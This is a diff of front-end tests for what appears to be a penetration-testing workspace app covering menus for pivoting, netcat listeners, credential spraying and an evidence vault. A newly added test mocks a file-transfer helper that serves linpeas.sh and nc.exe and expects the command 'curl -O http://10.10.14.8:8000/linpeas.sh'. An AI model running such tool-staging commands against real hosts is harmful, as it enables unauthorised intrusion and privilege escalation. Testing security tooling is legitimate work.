@@ -455,7 +455,7 @@ describe('M0 & M1-1 Application Shell, Dark-Red Locked vs Teal Unlocked Theme, a
 
     // 4. Open Hardware Bus & UART Logic Connection Modal (F-23)
     fireEvent.mouseEnter(toolsBtn);
-    const serialItem = screen.getByRole('menuitem', { name: /Hardware Bus & UART Logic \(F-23\)/i });
+    const serialItem = screen.getByRole('menuitem', { name: /Hardware Bus & UART Logic/i });
     fireEvent.click(serialItem);
 
     expect(screen.getByRole('dialog', { name: 'Serial Connection' })).toBeInTheDocument();
@@ -1069,8 +1069,8 @@ describe('M0 & M1-1 Application Shell, Dark-Red Locked vs Teal Unlocked Theme, a
       // Wait for initial vault load
       expect(await screen.findByText('Bastion EU')).toBeInTheDocument();
 
-      // 1. Open Terminals -> Proxy Profiles
-      const toolsBtn = screen.getByRole('button', { name: /Terminals ▾/i });
+      // 1. Open Networking & Pivoting -> Proxy Profiles
+      const toolsBtn = screen.getByRole('button', { name: /Networking & Pivoting/i });
       fireEvent.click(toolsBtn);
       const profilesMenuItem = screen.getByRole('menuitem', { name: /Proxy Profiles/i });
       fireEvent.click(profilesMenuItem);
@@ -2755,7 +2755,7 @@ describe('M0 & M1-1 Application Shell, Dark-Red Locked vs Teal Unlocked Theme, a
       // 1. Open Raw TCP modal via Terminals dropdown
       const toolsMenuBtn = screen.getByRole('button', { name: /^Terminals/i });
       fireEvent.click(toolsMenuBtn);
-      const rawTcpToolBtn = screen.getByText(/Raw TCP \/ Netcat \(F-31\)/i);
+      const rawTcpToolBtn = screen.getByText(/Raw TCP \/ Netcat/i);
       fireEvent.click(rawTcpToolBtn);
 
       // Verify Raw TCP modal opens
@@ -2786,7 +2786,7 @@ describe('M0 & M1-1 Application Shell, Dark-Red Locked vs Teal Unlocked Theme, a
       // 3. Test Inbound Listener mode
       // Re-open Raw TCP modal
       fireEvent.click(screen.getByRole('button', { name: /^Terminals/i }));
-      fireEvent.click(screen.getByText(/Raw TCP \/ Netcat \(F-31\)/i));
+      fireEvent.click(screen.getByText(/Raw TCP \/ Netcat/i));
 
       // Switch to Listener tab
       const listenerTabBtn = screen.getByRole('button', { name: /Inbound Listener/i });
@@ -2908,7 +2908,7 @@ describe('M0 & M1-1 Application Shell, Dark-Red Locked vs Teal Unlocked Theme, a
       // 1. Open Engagement menu -> Credential Pool & Spray Lists
       const engMenuBtn = screen.getByRole('button', { name: /Engagement ▾/i });
       fireEvent.click(engMenuBtn);
-      const credToolBtn = screen.getByText(/Credential Pool & Spray Lists \(F-36\)/i);
+      const credToolBtn = screen.getByText(/Credential Pool & Spray Lists/i);
       fireEvent.click(credToolBtn);
 
       // 2. Verify modal opened
@@ -2925,11 +2925,11 @@ describe('M0 & M1-1 Application Shell, Dark-Red Locked vs Teal Unlocked Theme, a
       fireEvent.click(sprayTabBtn);
 
       // Verify generated output and lockout warning rendered
-      expect(await screen.findByText(/LOCKOUT GUARD WARNING \(F-40\)/i)).toBeInTheDocument();
+      expect(await screen.findByText(/LOCKOUT GUARD WARNING/i)).toBeInTheDocument();
       expect(screen.getByText(/Lockout warning: 2 attempts approaches threshold/i)).toBeInTheDocument();
 
       // 5. Verify defensive lockout policy and wordlist preset rendered in Spray Generator
-      expect(screen.getByText(/DEFENSIVE LOCKOUT POLICY & SPRAY GUARD \(F-40\)/i)).toBeInTheDocument();
+      expect(screen.getByText(/DEFENSIVE LOCKOUT POLICY & SPRAY GUARD/i)).toBeInTheDocument();
       expect(screen.getByRole('button', { name: /RockYou Sample/i })).toBeInTheDocument();
 
       // 6. Close modal
@@ -3020,11 +3020,11 @@ describe('M0 & M1-1 Application Shell, Dark-Red Locked vs Teal Unlocked Theme, a
       // 1. Open Engagement menu -> Evidence Vault
       const engMenuBtn = screen.getByRole('button', { name: /Engagement ▾/i });
       fireEvent.click(engMenuBtn);
-      const eviToolBtn = screen.getByText(/Evidence Vault & Findings \(F-18\)/i);
+      const eviToolBtn = screen.getByText(/Evidence Vault & Findings/i);
       fireEvent.click(eviToolBtn);
 
       // 2. Verify modal opened
-      expect(await screen.findByText(/Evidence Vault & Findings \(F-18\)/i)).toBeInTheDocument();
+      expect(await screen.findByText(/Evidence Vault & Findings/i)).toBeInTheDocument();
       expect(screen.getByText(/Corpo Red Team 2026/i)).toBeInTheDocument();
 
       // Switch to Evidence tab
@@ -3144,8 +3144,8 @@ describe('M0 & M1-1 Application Shell, Dark-Red Locked vs Teal Unlocked Theme, a
 
       // 2. Open Engagement Tools dropdown and verify actions
       fireEvent.click(engToolsMenuBtn);
-      expect(screen.getByText(/Target Scope & Hub \(F-36\)/i)).toBeInTheDocument();
-      expect(screen.getByText(/Export \.daeng Package \(F-36\)/i)).toBeInTheDocument();
+      expect(screen.getByText(/Target Scope & Hub/i)).toBeInTheDocument();
+      expect(screen.getByText(/Export \.daeng Package/i)).toBeInTheDocument();
       expect(screen.queryByText(/Edit Scope & Lockout Policy/i)).toBeNull();
 
       // 3. Open New Engagement Modal
@@ -3168,6 +3168,168 @@ describe('M0 & M1-1 Application Shell, Dark-Red Locked vs Teal Unlocked Theme, a
       const toggleScopeBtn = screen.getByRole('button', { name: /In-Scope Only/i });
       fireEvent.click(toggleScopeBtn);
       expect(await screen.findByText('Personal Raspberry Pi')).toBeInTheDocument();
+    } finally {
+      delete (window as unknown as { go?: unknown }).go;
+    }
+  });
+
+  it('reorganizes Engagement, Terminals, View, and Networking & Pivoting dropdowns, opens Route Health as a workspace view, and provides File Transfer Helper in sidebar', async () => {
+    const startServerSpy = vi.fn().mockResolvedValue({
+      id: 'srv-1',
+      name: 'HTTP Staging :8000',
+      kind: 'builtin',
+      directory: 'C:\\Tools',
+      bindAddress: '0.0.0.0',
+      port: 8000,
+      enableUpload: true,
+      useTLS: false,
+      status: 'running',
+      startedAt: '2026-11-16T11:00:00Z',
+      servedCount: 0,
+      uploadCount: 0,
+      recentEvents: [],
+    });
+    const listHostedFilesSpy = vi.fn().mockImplementation(async (dir: string) => {
+      if (dir === 'C:\\Tools\\linux') {
+        return [
+          {
+            name: 'linpeas.sh',
+            relPath: 'linpeas.sh',
+            fullPath: 'C:\\Tools\\linux\\linpeas.sh',
+            isDir: false,
+            size: 2048,
+            modTime: '2026-11-16T10:00:00Z',
+          },
+        ];
+      }
+      return [
+        {
+          name: 'linux',
+          relPath: 'linux',
+          fullPath: 'C:\\Tools\\linux',
+          isDir: true,
+          size: 0,
+          modTime: '2026-11-16T10:00:00Z',
+        },
+        {
+          name: 'nc.exe',
+          relPath: 'nc.exe',
+          fullPath: 'C:\\Tools\\nc.exe',
+          isDir: false,
+          size: 4096,
+          modTime: '2026-11-16T10:00:00Z',
+        },
+      ];
+    });
+
+    try {
+      (window as unknown as { go: unknown }).go = {
+        main: {
+          App: {
+            HealthCheck: vi.fn().mockResolvedValue({
+              vaultLocked: false,
+              vaultInitialized: true,
+              passwordless: false,
+              quickUnlockReady: false,
+            }),
+            GetDefaultStagingDirectory: vi.fn().mockResolvedValue('C:\\Tools'),
+            GetLocalNetworkIPs: vi.fn().mockResolvedValue([
+              { interface: 'tun0', ip: '10.10.14.8', cidr: '10.10.14.8/23', isVpn: true },
+            ]),
+            ListFileTransferServers: vi.fn().mockResolvedValue([]),
+            ListHostedTransferFiles: listHostedFilesSpy,
+            HashHostedTransferFile: vi.fn().mockResolvedValue({
+              name: 'linpeas.sh',
+              relPath: 'linpeas.sh',
+              fullPath: 'C:\\Tools\\linux\\linpeas.sh',
+              isDir: false,
+              size: 2048,
+              sha256: 'deadbeef',
+              md5: 'cafebabe',
+              modTime: '2026-11-16T10:00:00Z',
+            }),
+            GenerateFileTransferCommands: vi.fn().mockResolvedValue({
+              filename: 'linpeas.sh',
+              url: 'http://10.10.14.8:8000/linpeas.sh',
+              localIp: '10.10.14.8',
+              port: 8000,
+              methods: [
+                {
+                  id: 'curl-disk',
+                  targetOs: 'linux',
+                  category: 'download',
+                  title: 'cURL',
+                  command: 'curl -O http://10.10.14.8:8000/linpeas.sh',
+                  notes: 'Direct HTTP download',
+                },
+              ],
+            }),
+            StartFileTransferServer: startServerSpy,
+            ListActiveManagedListeners: vi.fn().mockResolvedValue([]),
+            ListActivePivotInstances: vi.fn().mockResolvedValue([]),
+          },
+        },
+      };
+
+      render(<App />);
+      expect(await screen.findByLabelText('DoubleAgent Workspace')).toBeInTheDocument();
+
+      // 1. Engagement dropdown has no tunnels & routing items
+      fireEvent.click(screen.getByRole('button', { name: /Engagement ▾/i }));
+      const engMenu = screen.getByRole('menu', { name: /Engagement Specific Tools Menu/i });
+      expect(within(engMenu).queryByText(/Port Forwarding/i)).not.toBeInTheDocument();
+      expect(within(engMenu).queryByText(/Proxy Profiles/i)).not.toBeInTheDocument();
+      expect(within(engMenu).queryByText(/Pivoting Engine/i)).not.toBeInTheDocument();
+
+      // 2. Terminals dropdown no longer contains Port Forwarding, Proxy Profiles, Pivoting Engine, Route Health Check, or SFTP
+      fireEvent.click(screen.getByRole('button', { name: /Terminals ▾/i }));
+      const termMenu = screen.getByRole('menu', { name: /Terminals Menu/i });
+      expect(within(termMenu).queryByText(/Port Forwarding/i)).not.toBeInTheDocument();
+      expect(within(termMenu).queryByText(/Proxy Profiles/i)).not.toBeInTheDocument();
+      expect(within(termMenu).queryByText(/Pivoting Engine/i)).not.toBeInTheDocument();
+      expect(within(termMenu).queryByText(/Route Health Check/i)).not.toBeInTheDocument();
+      expect(within(termMenu).queryByText(/SFTP File Browser/i)).not.toBeInTheDocument();
+
+      // 3. Networking & Pivoting dropdown holds Port Forwarding, Proxy Profiles, and Pivoting Engine
+      fireEvent.click(screen.getByRole('button', { name: /Networking & Pivoting/i }));
+      const netMenu = screen.getByRole('menu', { name: /Networking and Pivoting Menu/i });
+      expect(within(netMenu).getByRole('menuitem', { name: 'Port Forwarding' })).toBeInTheDocument();
+      expect(within(netMenu).getByRole('menuitem', { name: 'Proxy Profiles' })).toBeInTheDocument();
+      expect(within(netMenu).getByRole('menuitem', { name: 'Pivoting Engine' })).toBeInTheDocument();
+
+      // 4. View menu contains SFTP File Browser and Route Health Check Dashboard, opening Route Health as a workspace view
+      fireEvent.click(screen.getByRole('button', { name: /^View/i }));
+      const viewMenu = screen.getByRole('menu', { name: 'View Menu' });
+      expect(within(viewMenu).getByRole('menuitem', { name: 'SFTP File Browser' })).toBeInTheDocument();
+      const routeHealthBtn = within(viewMenu).getByRole('menuitem', { name: 'Route Health Check Dashboard' });
+      fireEvent.click(routeHealthBtn);
+
+      expect(await screen.findByRole('region', { name: 'Route Health Check' })).toBeInTheDocument();
+      expect(screen.queryByRole('dialog', { name: 'Route Health Check' })).not.toBeInTheDocument();
+
+      // 5. File Transfer Helper in sidebar lets you browse folders, select files, and start staging server
+      const transferBtn = screen.getByRole('button', { name: 'File Transfer Helper Panel' });
+      fireEvent.click(transferBtn);
+
+      expect(await screen.findByText('nc.exe')).toBeInTheDocument();
+      fireEvent.click(screen.getByText('linux'));
+      expect(await screen.findByText('linpeas.sh')).toBeInTheDocument();
+      fireEvent.click(screen.getByText('linpeas.sh'));
+
+      await waitFor(() => {
+        expect(screen.getByText(/curl -O http:\/\/10\.10\.14\.8:8000\/linpeas\.sh/)).toBeInTheDocument();
+      });
+
+      fireEvent.click(screen.getByRole('button', { name: /Start HTTP Server \(:8000\)/i }));
+      await waitFor(() => {
+        expect(startServerSpy).toHaveBeenCalledWith(
+          expect.objectContaining({
+            kind: 'builtin',
+            directory: 'C:\\Tools\\linux',
+            port: 8000,
+          })
+        );
+      });
     } finally {
       delete (window as unknown as { go?: unknown }).go;
     }
